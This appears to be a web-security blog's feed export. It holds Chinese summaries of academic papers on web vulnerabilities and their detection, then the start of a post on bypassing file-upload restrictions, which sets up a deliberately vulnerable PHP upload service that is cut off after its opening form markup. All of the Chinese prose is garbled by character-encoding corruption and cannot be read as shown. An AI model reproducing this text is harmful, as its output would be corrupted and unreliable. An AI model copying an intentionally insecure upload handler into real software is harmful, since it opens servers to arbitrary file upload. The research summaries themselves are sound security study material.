URLï¼Œä½†æ˜¯æ²¡æœ‰å¤šå°‘æ—¶é—´ï¼Œæœ¬æ–‡è°ƒæŸ¥äº†2014-2016å¹´googleå¸‚åœºçš„APPï¼Œå‘ç°æ–°çš„è¿æ¥æ–¹å¼å¹¶æ²¡æœ‰å¸¦æ¥å®‰å…¨æ€§æ”¹å–„ï¼Œåªæœ‰2.2%çš„åº”ç”¨æ­£ç¡®ä½¿ç”¨äº†æ–°æ–¹æ³•ï¼Œå¦å¤–ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ç§æ–°çš„é£é™©ï¼Œæœ€åï¼Œæˆ‘ä»¬å‘ç°äº†æ›´å¤šçš„URLåŠ«æŒçš„æ¡ˆä¾‹ã€‚</p><h2 id="AUTHSCOPE-Towards-Automatic-Discovery-of-Vulnerable-Authorizations-in-Online-Services-ccs17"><a href="#AUTHSCOPE-Towards-Automatic-Discovery-of-Vulnerable-Authorizations-in-Online-Services-ccs17" class="headerlink" title="AUTHSCOPE: Towards Automatic Discovery of Vulnerable Authorizations in Online Services, ccs17*"></a>AUTHSCOPE: Towards Automatic Discovery of Vulnerable Authorizations in Online Services, ccs17*</h2><p>æœ¬æ–‡è®¾è®¡AuthScopeå·¥å…·ï¼Œè¯¥å·¥å…·èƒ½å¤Ÿè‡ªåŠ¨æ‰§è¡Œç§»åŠ¨åº”ç”¨ç¨‹åºï¼Œå¹¶åœ¨ç›¸åº”çš„åœ¨çº¿æœåŠ¡ä¸­è¯†åˆ«å‡ºæ˜“å—æ”»å‡»çš„è®¿é—®æ§åˆ¶å®ç°ã€‚</p><h2 id="Effective-Real-Time-Android-Application-Auditing-S-amp-P14"><a href="#Effective-Real-Time-Android-Application-Auditing-S-amp-P14" class="headerlink" title="Effective Real-Time Android Application Auditing, S&amp;P14"></a>Effective Real-Time Android Application Auditing, S&amp;P14</h2><p>æœ¬æ–‡è®¾è®¡äº†ä¸€å¥—åŠ¨æ€å®¡è®¡å·¥å…·æ¥æ£€æŸ¥åº”ç”¨æ˜¯å¦å­˜åœ¨<strong>æ•°æ®æ³„éœ²</strong>é—®é¢˜ï¼Œé™ä½é™æ€æ£€æµ‹çš„è¯¯æŠ¥ç‡ã€‚</p><h1 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h1><p>jså­˜åœ¨çš„å®‰å…¨é—®é¢˜åŒ…å«äº†XSSï¼Œå› æ­¤è¿™é‡Œæ’é™¤äº†XSSã€‚</p><h2 id="CodeAlchemist-Semantics-Aware-Code-Generation-to-Find-Vulnerabilities-in-JavaScript-Engines-ndss19"><a href="#CodeAlchemist-Semantics-Aware-Code-Generation-to-Find-Vulnerabilities-in-JavaScript-Engines-ndss19" class="headerlink" title="CodeAlchemist: Semantics-Aware Code Generation to Find Vulnerabilities in JavaScript Engines, ndss19"></a>CodeAlchemist: Semantics-Aware Code Generation to Find Vulnerabilities in JavaScript Engines, ndss19</h2><p>æœ¬æ–‡è®¾è®¡äº†ä¸€å¥—jsä»£ç ç”Ÿæˆå·¥å…·ï¼Œå®ƒå¯ä»¥ç”Ÿæˆè¯­ä¹‰å’Œè¯­æ³•ä¸Šéƒ½æ­£ç¡®çš„JavaScriptç‰‡æ®µï¼Œå› æ­¤å¯ä»¥<strong>ç”¨äºfuzzæ¥å‘ç°JavaScriptå¼•æ“çš„æ¼æ´</strong>ã€‚å…·ä½“æ¥è¯´ï¼Œè¯¥å·¥å…·å°†ç§å­åˆ†è§£ä¸ºä»£ç ç‰‡æ®µï¼Œæ¯ä¸€ä¸ªç‰‡æ®µç”¨ä¸€æ®µçº¦æŸæ¥æ ‡è®°ï¼Œè¿™äº›çº¦æŸè¡¨ç¤ºå®ƒä¸å…¶ä»–ä»£ç å—åœ¨ä¸€èµ·çš„æ¡ä»¶ã€‚</p><h2 id="SYNODE-Understanding-and-Automatically-Preventing-Injection-Attacks-on-NODE-JS-ndss18"><a href="#SYNODE-Understanding-and-Automatically-Preventing-Injection-Attacks-on-NODE-JS-ndss18" class="headerlink" title="SYNODE: Understanding and Automatically Preventing Injection Attacks on NODE.JS, ndss18"></a>SYNODE: Understanding and Automatically Preventing Injection Attacks on NODE.JS, ndss18</h2><p>æœ¬æ–‡å‘ç°Nodejsçš„å¾ˆå¤šæ¨¡å—å­˜åœ¨å‘½ä»¤æ³¨å…¥æ”»å‡»çš„é—®é¢˜ï¼Œå› æ­¤æœ¬æ–‡æå‡ºäº†Synodeï¼Œä¸€ç§ç»“åˆé™æ€åˆ†æå’ŒåŠ¨æ€çš„æ–¹æ³•ï¼Œä½¿å¼€å‘è€…å®‰å…¨çš„ä½¿ç”¨è¿™äº›æœ‰é—®é¢˜çš„åº“ã€‚å…·ä½“æ¥è¯´ï¼ŒSynodeé™æ€åˆ†æå“ªäº›å€¼ä¼šä¼ æ’­åˆ°APIä¸­ï¼Œå¹¶ä¸”åœ¨å®‰è£…æ—¶ä¿®å¤ï¼›åŠ¨æ€è¿è¡Œæ—¶ï¼Œå®ƒæˆªæ¶æ„è¯·æ±‚é˜²æ­¢ä»–ä»¬ä¼ é€’åˆ°apiä¸­ã€‚</p><h3 id="ç›¸å…³å·¥ä½œ"><a href="#ç›¸å…³å·¥ä½œ" class="headerlink" title="ç›¸å…³å·¥ä½œ"></a>ç›¸å…³å·¥ä½œ</h3><ul><li>X. Jin, X. Hu, K. Ying, W. Du, H. Yin, and G. N. Peri. Code injection attacks on HTML5-based mobile apps: Characterization, detection and mitigation. In Conference on Computer and Communications Security, pages 66â€“77, 2014</li><li>P. Saxena, D. Molnar, and B. Livshits. SCRIPTGARD: automatic context-sensitive sanitization for large-scale legacy web applications. In CCS, pages 601â€“614, 2011. </li><li>M. Ter Louw and V. N. Venkatakrishnan. Blueprint: Robust prevention of cross-site scripting attacks for existing browsers. In Sec. and Privacy, pages 331â€“346, 2009. </li><li>S. Guarnieri and B. Livshits. GATEKEEPER: mostly static enforcement of security and reliability policies for JavaScript code. In USENIX Security, pages 151â€“168, 2009. </li></ul><h2 id="Thou-Shalt-Not-Depend-on-Me-Analysing-the-Use-of-Outdated-JavaScript-Libraries-on-the-Web-survey-ndss17"><a href="#Thou-Shalt-Not-Depend-on-Me-Analysing-the-Use-of-Outdated-JavaScript-Libraries-on-the-Web-survey-ndss17" class="headerlink" title="Thou Shalt Not Depend on Me: Analysing the Use of Outdated JavaScript Libraries on the Web (survey), ndss17"></a>Thou Shalt Not Depend on Me: Analysing the Use of Outdated JavaScript Libraries on the Web (survey), ndss17</h2><p>æœ¬æ–‡å¯¹Alexaæœ‰æ’è¡Œçš„ç½‘ç«™é•œåƒè¿›è¡Œäº†è°ƒæŸ¥ï¼Œå‘ç°webå¼€å‘è€…ä¼šåº”ç”¨å¾ˆå¤šç¬¬ä¸‰æ–¹åº“ï¼ˆæ¯”å¦‚jQueryï¼‰ï¼Œè¿™äº›åº“çš„æ—§ç‰ˆæœ¬å­˜åœ¨æ¼æ´ã€‚</p><h2 id="The-Unexpected-Dangers-of-Dynamic-JavaScript-survey-usenix15"><a href="#The-Unexpected-Dangers-of-Dynamic-JavaScript-survey-usenix15" class="headerlink" title="The Unexpected Dangers of Dynamic JavaScript (survey), usenix15"></a>The Unexpected Dangers of Dynamic JavaScript (survey), usenix15</h2><p>JSå­˜åœ¨XSSç­‰å®‰å…¨æ€§é—®é¢˜ï¼Œä¸ºæ­¤æœ¬æ–‡è¿›è¡Œäº†å®è¯ç ”ç©¶äº†å®ƒçš„å½±å“ï¼Œå¹¶ä¸”æå‡ºäº†å®‰å…¨é˜²æŠ¤æ–¹æ³•ã€‚</p><h2 id="ZigZag-Automatically-Hardening-Web-Applications-Against-Client-side-Validation-Vulnerabilities-usenix15"><a href="#ZigZag-Automatically-Hardening-Web-Applications-Against-Client-side-Validation-Vulnerabilities-usenix15" class="headerlink" title="ZigZag: Automatically Hardening Web Applications Against Client-side Validation Vulnerabilities, usenix15"></a>ZigZag: Automatically Hardening Web Applications Against Client-side Validation Vulnerabilities, usenix15</h2><p>ç°ä»£ç½‘ç«™å¤§é‡ä¾èµ–JSï¼Œè¿™äº›JSçš„å®¢æˆ·ç«¯éªŒè¯ï¼ˆclient-side validation,CSVï¼‰å­˜åœ¨è„†å¼±æ€§ï¼ˆå®é™…ä¸Šæ˜¯é€»è¾‘é—®é¢˜ï¼‰ï¼Œæœ¬æ–‡æå‡ºäº†ä¸€ä¸ªæ£€æµ‹è¯¥ç±»é—®é¢˜çš„ç³»ç»ŸZigZagï¼Œå®ƒæ˜¯ä¸€ä¸ªä»£ç†ï¼Œé€æ˜çš„æ£€æµ‹ç”¨æˆ·ç«¯ä»£ç ï¼Œå¹¶ä¸”å®æ—¶çš„è·å–æ‰§è¡ŒçŠ¶æ€ï¼Œä»ä¸­äº§ç”Ÿæ§åˆ¶æµå’Œæ•°æ®ï¼Œä»¥æ­¤è¯†åˆ«ä¸æ”»å‡»ç›¸å…³çš„æ“ä½œã€‚</p><h2 id="Hunting-the-Red-Fox-Online-Understanding-and-Detection-of-Mass-Redirect-Script-Injections-S-amp-P14"><a href="#Hunting-the-Red-Fox-Online-Understanding-and-Detection-of-Mass-Redirect-Script-Injections-S-amp-P14" class="headerlink" title="Hunting the Red Fox Online: Understanding and Detection of Mass Redirect-Script Injections, S&amp;P14"></a>Hunting the Red Fox Online: Understanding and Detection of Mass Redirect-Script Injections, S&amp;P14</h2><p>æœ¬æ–‡å¼€å‘äº†å·¥å…·JsREDï¼Œä¸€ç§ç”¨äºè‡ªåŠ¨æ£€æµ‹<strong>é‡å®šå‘è„šæœ¬æ³¨å…¥</strong>çš„æ–°æŠ€æœ¯ï¼Œå®ƒé€šè¿‡æ¯”è¾ƒå½“å‰çš„JS-libç‰ˆæœ¬å’Œæ­£å¸¸çš„ç‰ˆæœ¬å·®å¼‚åˆ¤æ–­è„šæœ¬æ˜¯å¦è¢«æ›¿æ¢ã€‚</p><h1 id="Access-control"><a href="#Access-control" class="headerlink" title="Access control"></a>Access control</h1><h2 id="FlowWatcher-Defending-against-Data-Disclosure-Vulnerabilities-in-Web-Applications-css15"><a href="#FlowWatcher-Defending-against-Data-Disclosure-Vulnerabilities-in-Web-Applications-css15" class="headerlink" title="FlowWatcher: Defending against Data Disclosure Vulnerabilities in Web Applications, css15"></a>FlowWatcher: Defending against Data Disclosure Vulnerabilities in Web Applications, css15</h2><p>webåº”ç”¨ä¼šå‡ºç°æ°´å¹³è¶Šæƒçš„é—®é¢˜ï¼Œç”±äºå¾ˆå¤šç½‘ç«™çš„ç”¨æˆ·è®¿é—®æ§åˆ¶æ¨¡å‹ç±»ä¼¼ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å¸ƒç½®ä¸€ä¸ªå¤–éƒ¨ä»£ç†ï¼ˆnginxç«¯ï¼‰ï¼Œç„¶åè§‚å¯Ÿç”¨æˆ·çš„æ‰€æœ‰æµé‡ï¼Œç„¶åæ ¹æ®é¢„æœŸçš„è®¿é—®æ§åˆ¶ç­–ç•¥è§„èŒƒæ¥ä¾¦æµ‹æœªç»æˆæƒçš„è®¿é—®ã€‚</p><h2 id="MACE-Detecting-Privilege-Escalation-Vulnerabilities-in-Web-Applications-css14"><a href="#MACE-Detecting-Privilege-Escalation-Vulnerabilities-in-Web-Applications-css14" class="headerlink" title="MACE: Detecting Privilege Escalation Vulnerabilities in Web Applications, css14"></a>MACE: Detecting Privilege Escalation Vulnerabilities in Web Applications, css14</h2><p>æˆ‘ä»¬å®ç°äº†å·¥å…·MACEï¼Œé€šè¿‡è®¿é—®èµ„æºæ—¶çš„ä¸Šä¸‹æ–‡ä¸ä¸€è‡´æ€§æ¥è¯†åˆ«æ°´å¹³ç‰¹æƒå‡çº§æ¼æ´</p><h2 id="Automating-Isolation-and-Least-Privilege-in-Web-Services-S-amp-P14"><a href="#Automating-Isolation-and-Least-Privilege-in-Web-Services-S-amp-P14" class="headerlink" title="Automating Isolation and Least Privilege in Web Services, S&amp;P14"></a>Automating Isolation and Least Privilege in Web Services, S&amp;P14</h2><p>æœ¬æ–‡è®¾è®¡äº†ä¸€ä¸ªé˜²æ­¢æ•°æ®æœªæˆæƒè¯»å†™çš„ç³»ç»ŸPasseï¼Œå®ƒåŠ¨æ€åœ°ä»å¼€å‘è€…æä¾›çš„æµ‹è¯•ç”¨ä¾‹åˆ†ææ•°æ®æµå’Œæ§åˆ¶æµï¼Œå°†åº”ç”¨åˆ†ç¦»æˆå‡ ä¸ªæ¨¡å—ï¼Œå¹¶ä¸”å°†æ¨¡å—æ”¾å…¥æ²™ç›’ä¸­è¿è¡Œã€‚å¦å¤–ï¼Œæˆ‘ä»¬å°†PasseåµŒå…¥äº†Djangoæ¡†æ¶ä¸­ï¼Œæˆ‘ä»¬å‘ç°å®ƒå¯ä»¥æ­£ç¡®åœ°åˆ†æ96%çš„ç­–ç•¥ï¼ŒåŒæ—¶è¿˜å¯ä»¥é˜²å¾¡XSSæ”»å‡»ã€‚</p><h1 id="Survey"><a href="#Survey" class="headerlink" title="Survey"></a>Survey</h1><p>èƒ½åˆ†ç±»çš„surveyå·²ç»åˆ†åˆ°å…·ä½“çš„ç±»å‹ä¸­ï¼Œè¿™é‡Œåˆ—å‡ºä¸webç›¸å…³çš„å…¶ä»–è°ƒæŸ¥ã€‚</p><h2 id="Same-Origin-Policy-Evaluation-in-Modern-Browsers-usenix17"><a href="#Same-Origin-Policy-Evaluation-in-Modern-Browsers-usenix17" class="headerlink" title="Same-Origin Policy: Evaluation in Modern Browsers, usenix17"></a>Same-Origin Policy: Evaluation in Modern Browsers, usenix17</h2><p>SOP-DOMæ˜¯åŒæºç­–ç•¥çš„è‡ªå·±ï¼Œå®ƒæ§åˆ¶ä¸»æ–‡æ¡£å’ŒåµŒå…¥æ–‡æ¡£ä¹‹é—´çš„äº¤äº’ï¼Œä½†æ˜¯æ²¡æœ‰æ­£å¼çš„è§„èŒƒï¼Œæœ¬æ–‡é€šè¿‡å®è¯ç ”ç©¶ï¼Œå‘ç°é™¤äº†Web Originsä¹‹å¤–ï¼ŒSOP-DOMæˆäºˆçš„è®¿é—®æƒé™è‡³å°‘å–å†³äºä¸‰ä¸ªå±æ€§ï¼šåµŒå…¥å…ƒç´ ï¼ˆEEï¼‰çš„ç±»å‹ï¼Œæ²™ç®±ï¼ˆæµè§ˆå™¨ï¼‰å’ŒCORSå±æ€§ã€‚</p><h2 id="How-the-Web-Tangled-Itself-Uncovering-the-History-of-Client-Side-Web-In-Security-usenix17"><a href="#How-the-Web-Tangled-Itself-Uncovering-the-History-of-Client-Side-Web-In-Security-usenix17" class="headerlink" title="How the Web Tangled Itself: Uncovering the History of Client-Side Web (In)Security, usenix17"></a>How the Web Tangled Itself: Uncovering the History of Client-Side Web (In)Security, usenix17</h2><p>æœ¬æ–‡æ£€æŸ¥äº†97-16å¹´çš„é‡è¦ç½‘ç«™ä»£ç å’Œå¤´ä¿¡æ¯ï¼Œä»¥æ­¤ç¡®å®šwebæŠ€æœ¯çš„å…³é”®è¶‹åŠ¿ï¼Œéšåè¯„ä¼°ä¸ä¹‹å…³è”çš„æ¼æ´ï¼Œåœ¨è°ƒæŸ¥è§£å†³ä»–ä»¬çš„å®‰å…¨é˜²å¾¡æœºåˆ¶ã€‚æœ¬æ–‡å‘ç°è‡ª2000å¹´ä»¥æ¥ï¼ŒJavaScriptå¼€å§‹æµè¡Œï¼Œå®¢æˆ·ç«¯æ³¨å…¥çš„å¯èƒ½æ€§å¢åŠ ï¼Œä½†CSPçš„éƒ¨ç½²å´æ²¡æœ‰è·Ÿä¸Šï¼Œå¦å¤–ä½¿ç”¨HTTP only cookieçš„ç½‘ç«™æ›´å®¹æ˜“é­å—XSSã€‚</p><h1 id="Fingerprint"><a href="#Fingerprint" class="headerlink" title="Fingerprint"></a>Fingerprint</h1><h2 id="k-fingerprinting-A-Robust-Scalable-Website-Fingerprinting-Technique-fingerprint-usenix16"><a href="#k-fingerprinting-A-Robust-Scalable-Website-Fingerprinting-Technique-fingerprint-usenix16" class="headerlink" title="k-fingerprinting: A Robust Scalable Website Fingerprinting Technique(fingerprint), usenix16"></a>k-fingerprinting: A Robust Scalable Website Fingerprinting Technique(fingerprint), usenix16</h2><p>æ”»å‡»è€…å¯ä»¥åœ¨torç½‘ç»œä¸­å®æ–½è¢«åŠ¨æ”»å‡»æ¯”å¦‚ï¼ŒæŒ‡çº¹è¯†åˆ«ï¼Œæœ¬æ–‡æå‡ºäº†åŸºäºéšæœºæ£®æ—çš„ç½‘ç«™æŒ‡çº¹è¯†åˆ«æŠ€æœ¯ï¼Œå®ƒèƒ½æŠµæŠ—torå’Œå…ˆè¿›çš„ç½‘ç«™æŒ‡çº¹è¯†åˆ«é˜²å¾¡æŠ€æœ¯ã€‚</p><h2 id="Cloak-of-Visibility-Detecting-When-Machines-Browse-a-Different-Web-fingerprint-S-amp-P16"><a href="#Cloak-of-Visibility-Detecting-When-Machines-Browse-a-Different-Web-fingerprint-S-amp-P16" class="headerlink" title="Cloak of Visibility: Detecting When Machines Browse a Different Web(fingerprint), S&amp;P16"></a>Cloak of Visibility: Detecting When Machines Browse a Different Web(fingerprint), S&amp;P16</h2><p>æ¶æ„ç½‘ç«™ä¼šä½¿ç”¨å¤æ‚æŠ€æœ¯éšè—è‡ªèº«ï¼Œé˜²æ­¢è¢«æœç´¢å¼•æ“å‘ç°å…¶æœ¬è´¨ã€‚æˆ‘ä»¬è°ƒæŸ¥äº†æš—ç½‘çš„åå¤§è‘—åæŠ€æœ¯ï¼Œå¹¶ä¸”å¼€å‘äº†ä¸€ç§åéšèº«ç³»ç»Ÿã€‚</p><h2 id="JavaScript-Template-Attacks-Automatically-Inferring-Host-Information-for-Targeted-Exploits-fingerprint-ndss19"><a href="#JavaScript-Template-Attacks-Automatically-Inferring-Host-Information-for-Targeted-Exploits-fingerprint-ndss19" class="headerlink" title="JavaScript Template Attacks: Automatically Inferring Host Information for Targeted Exploits(fingerprint), ndss19"></a>JavaScript Template Attacks: Automatically Inferring Host Information for Targeted Exploits(fingerprint), ndss19</h2><p>å¦‚ä»Šçš„æµè§ˆå™¨ä¼šæä¾›åŒ¿ååŠŸèƒ½éšè—ä¿¡æ¯ï¼Œè€Œæœ¬æ–‡æå‡ºäº†ä¸€ç§è‡ªåŠ¨åŒ–æ¨æ–­ç³»ç»Ÿä¿¡æ¯ï¼ˆåŒ…æ‹¬è½¯ä»¶å’Œç¡¬ä»¶ï¼‰çš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•é€šè¿‡JavaScriptå¼•æ“æ”¶é›†å„ç§æ•°æ®ï¼Œå†æ ¹æ®è¿™äº›å±æ€§åˆ›å»ºæ¨¡æ¿ï¼Œå¦‚æœè¿™ä¸ªæ¨¡æ¿çš„æŸä¸€å±æ€§åœ¨å„ä¸ªç³»ç»Ÿä¸Šéƒ½ä¸ç›¸åŒåˆ™å®ƒæ˜¯ä¸€ä¸ªä¾èµ–äºç¯å¢ƒçš„å±æ€§ã€‚</p><h1 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h1><h2 id="On-Omitting-Commits-and-Committing-Omissions-Preventing-Git-Metadata-Tampering-That-Re-introduces-Software-Vulnerabilities-git-usenix16"><a href="#On-Omitting-Commits-and-Committing-Omissions-Preventing-Git-Metadata-Tampering-That-Re-introduces-Software-Vulnerabilities-git-usenix16" class="headerlink" title="On Omitting Commits and Committing Omissions: Preventing Git Metadata Tampering That (Re)introduces Software Vulnerabilities (git), usenix16"></a>On Omitting Commits and Committing Omissions: Preventing Git Metadata Tampering That (Re)introduces Software Vulnerabilities (git), usenix16</h2><p>å…ƒæ•°æ®æ”»å‡»æŒ‡é’ˆå¯¹ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„æ”»å‡»æ–¹æ³•ï¼Œå®ƒæ¬ºéª—å¼€å‘è€…æ‰§è¡Œæ„å¤–æ“ä½œï¼Œæ¯”å¦‚å°†æœªç»æµ‹è¯•çš„ä»£ç åˆå¹¶åˆ°ç”Ÿäº§åˆ†æ”¯ä¸­ï¼Œæˆ–æ˜¯åŒ…å«ä¸€è‡´æ¼æ´çš„ç»„ä»¶ã€‚æœ¬æ–‡æå‡ºäº†ä¸€ç§é˜²å¾¡æ–¹æ¡ˆï¼Œé€šè¿‡ç»´æŠ¤å¼€å‘äººå‘˜çš„åŠ å¯†ç­¾ååçš„æ—¥å¿—ç¯èŠ‚è¿™äº›æ”»å‡»ã€‚</p><h2 id="Automatically-Detecting-Vulnerable-Websites-Before-They-Turn-Malicious-mechine-learning-usenix14"><a href="#Automatically-Detecting-Vulnerable-Websites-Before-They-Turn-Malicious-mechine-learning-usenix14" class="headerlink" title="Automatically Detecting Vulnerable Websites Before They Turn Malicious (mechine learning), usenix14"></a>Automatically Detecting Vulnerable Websites Before They Turn Malicious (mechine learning), usenix14</h2><p>æœ¬æ–‡ä½¿ç”¨æ•°æ®æŒ–æ˜å’Œæœºå™¨å­¦ä¹ çš„å‡ ç§æŠ€æœ¯ï¼Œæ¥é¢„æµ‹ä¸€ä¸ªç»™å®šçš„ã€æœªè¢«ä¾µå…¥çš„ç½‘ç«™æ˜¯å¦ä¼šå˜å¾—æœ‰é—®é¢˜ã€‚</p><h2 id="Static-detection-of-asymptotic-resource-side-channel-vulnerabilities-in-web-applications-side-channel-ase17"><a href="#Static-detection-of-asymptotic-resource-side-channel-vulnerabilities-in-web-applications-side-channel-ase17" class="headerlink" title="Static detection of asymptotic resource side-channel vulnerabilities in web applications (side channel), ase17"></a>Static detection of asymptotic resource side-channel vulnerabilities in web applications (side channel), ase17</h2><p>æœ¬æ–‡å¼€å‘äº†ä¸€ä¸ªSCANNERçš„å·¥å…·ï¼Œç”¨äºæ£€æµ‹PHPåº”ç”¨ç¨‹åºä¸­ä¸èµ„æºç›¸å…³çš„ä¾§ä¿¡é“æ³„éœ²æ¼æ´â€”â€”ä¾‹å¦‚ä¸€ä¸ªå…³äºå¥åº·çš„ç½‘ç«™ï¼Œæ³„éœ²äº†ç—…äººåƒè¯çš„æ—¶é—´ã€‚</p><h2 id="Predicting-Impending-Exposure-to-Malicious-Content-from-User-Behavior-defense-ccs18"><a href="#Predicting-Impending-Exposure-to-Malicious-Content-from-User-Behavior-defense-ccs18" class="headerlink" title="Predicting Impending Exposure to Malicious Content from User Behavior(defense), ccs18"></a>Predicting Impending Exposure to Malicious Content from User Behavior(defense), ccs18</h2><p>æœ¬æ–‡æå‡ºäº†ä¸€ç§ç³»ç»Ÿï¼Œå¯ä»¥å†å•ä¸ªæµè§ˆä¼šè¯çº§åˆ«ä¸Šè§‚å¯Ÿç”¨æˆ·è¡Œä¸ºï¼Œä»è€Œé¢„æµ‹ä»–ä»¬æ˜¯å¦æ˜¯æ”»å‡»å‹ä¸ºï¼Œå·²è¾¾åˆ°æå‰é¢„é˜²çš„ç›®çš„ã€‚</p><h2 id="Deemon-Detecting-CSRF-with-Dynamic-Analysis-and-Property-Graphs-CSRF-ccs17"><a href="#Deemon-Detecting-CSRF-with-Dynamic-Analysis-and-Property-Graphs-CSRF-ccs17" class="headerlink" title="Deemon: Detecting CSRF with Dynamic Analysis and Property Graphs (CSRF), ccs17"></a>Deemon: Detecting CSRF with Dynamic Analysis and Property Graphs (CSRF), ccs17</h2><p>æœ¬æ–‡æå‡ºæ£€æµ‹CSRFçš„æ¡†æ¶ï¼Œè¯¥æ¡†æ¶è€ƒè™‘äº†webåº”ç”¨çš„æ‰§è¡Œæµç¨‹ï¼Œæ•°æ®æµä»¥åŠæ•´ä½“æ¶æ„ï¼Œæ„å»ºä¸€ä¸ªå±æ€§å›¾ï¼Œç„¶åä½¿ç”¨å›¾éå†ï¼Œå‘è§‰æ½œåœ¨çš„CSRFé—®é¢˜ã€‚Deemonè‡ªåŠ¨åˆ¤æ–­webåº”ç”¨çš„æ‰§è¡Œç¯å¢ƒï¼Œæ¥ç€æ— ç›‘ç£çš„äº§ç”ŸåŠ¨æ€è®°å½•ï¼Œæ¯”å¦‚ç½‘ç»œäº¤äº’ï¼ŒæœåŠ¡ç«¯æ‰§è¡Œå’Œæ•°æ®åº“æ“ä½œï¼Œä½¿ç”¨è¿™äº›è®°å½•Deemonæ„å»ºä¸€ä¸ªå›¾æ¨¡å‹ï¼Œä»–è¡¨ç¤ºæ•è·çš„çŠ¶æ€è½¬æ¢å’Œæ•°æ®æµï¼›æ¥ç€éå†è¿™ä¸ªå›¾æ¥å‘è§‰httpçŠ¶æ€å˜æ¢ï¼Œè¿™äº›å˜æ¢ä¸CSRFæµåŠ¨ç°éª¨å¹²ã€‚</p><h2 id="Attack-Patterns-for-Black-Box-Security-Testing-of-Multi-Party-Web-Applications-SSO-ndss16"><a href="#Attack-Patterns-for-Black-Box-Security-Testing-of-Multi-Party-Web-Applications-SSO-ndss16" class="headerlink" title="Attack Patterns for Black-Box Security Testing of Multi-Party Web Applications(SSO), ndss16*"></a>Attack Patterns for Black-Box Security Testing of Multi-Party Web Applications(SSO), ndss16*</h2><p>æˆ‘ä»¬é’ˆå¯¹å•ç‚¹ç™»é™†(SSO)å­˜åœ¨çš„é—®é¢˜ï¼Œè®¾è®¡äº†ä¸¤ç§æ”»å‡»æ¨¡å¼CSRFå’ŒXSSï¼Œå¹¶ä¸”åŸºäºZAPè®¾è®¡äº†æ‰«æå™¨ï¼Œç»è¿‡å®éªŒæˆ‘ä»¬å‘å…ˆå®ƒèƒ½å‘ç°çŸ¥åç½‘ç«™çš„å®‰å…¨æ€§é—®é¢˜ã€‚</p><h2 id="Toward-Black-Box-Detection-of-Logic-Flaws-in-Web-Applications-Logic-Flaws-ndss14"><a href="#Toward-Black-Box-Detection-of-Logic-Flaws-in-Web-Applications-Logic-Flaws-ndss14" class="headerlink" title="Toward Black-Box Detection of Logic Flaws in Web Applications (Logic Flaws), ndss14"></a>Toward Black-Box Detection of Logic Flaws in Web Applications (Logic Flaws), ndss14</h2><p>ç”±äºç¼ºå¤±æ–‡æ¡£ï¼Œåˆ¤æ–­é€»è¾‘æ¼æ´ååˆ†å›°éš¾ï¼Œç°æœ‰çš„å·¥å…·éœ€è¦è°ƒæŸ¥æºä»£ç æˆ–æ˜¯åªé€‚ç”¨äºå°è§„æ¨¡åº”ç”¨ï¼Œè€Œæˆ‘ä»¬åˆ©ç”¨ç”¨æˆ·äº§ç”Ÿçš„æµé‡äº§ç”Ÿä¸€ä¸ªè¡Œä¸ºåºåˆ—ï¼Œæ¥ç€é‡ç”¨è¿™ä¸ªåºåˆ—åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜åœ¨é—®é¢˜ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-å­¦æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> å­¦æœ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®¹å™¨ä¸Šä¼ ç»•è¿‡æ€»ç»“</title>
      <link href="/%E7%BB%84%E4%BB%B6-%E5%AE%B9%E5%99%A8%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
      <url>/%E7%BB%84%E4%BB%B6-%E5%AE%B9%E5%99%A8%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="æ­å»ºæ¼æ´æœåŠ¡"><a href="#æ­å»ºæ¼æ´æœåŠ¡" class="headerlink" title="æ­å»ºæ¼æ´æœåŠ¡"></a>æ­å»ºæ¼æ´æœåŠ¡</h1><p>è¿˜æ˜¯å…ˆæ­ä¸€ä¸ªæ¼æ´çš„æœåŠ¡å§ï¼šæ–°å»ºä¸€ä¸ª~/Desktop/php/uploadæ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹ä¸‹å­˜åœ¨å¦‚ä¸‹ç»“æ„çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ tree</span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ files</span><br><span class="line">â””â”€â”€ upload.php</span><br><span class="line"></span><br><span class="line">1 directory, 1 file</span><br></pre></td></tr></table></figure><p>upload.php:</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot;</span><br><span 